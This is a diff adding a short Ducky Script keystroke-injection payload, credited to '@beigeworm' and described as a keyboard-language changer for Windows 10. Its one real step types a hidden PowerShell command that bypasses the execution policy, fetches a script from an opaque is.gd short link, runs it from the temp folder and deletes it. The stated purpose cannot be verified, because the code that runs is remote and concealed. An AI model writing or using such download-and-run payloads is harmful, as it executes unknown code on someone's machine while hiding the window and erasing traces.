@@ -1,0 +1,17 @@
+REM Title: beigeworm's Keyboard Language changer.
+REM Author: @beigeworm
+REM Description: This script changes the keyboard layout and system language to US.
+REM Target: Windows 10
+
+REM some setup for dukie script
+DEFAULT_DELAY 100
+
+REM open powershell (remove "-W H" to show the window)
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -ep bypass -w h -c cd $env:temp; irm is.gd/3jgz85 > run.ps1; & run.ps1; sleep 1; rm run.ps1 -force
+ENTER
+
+
+
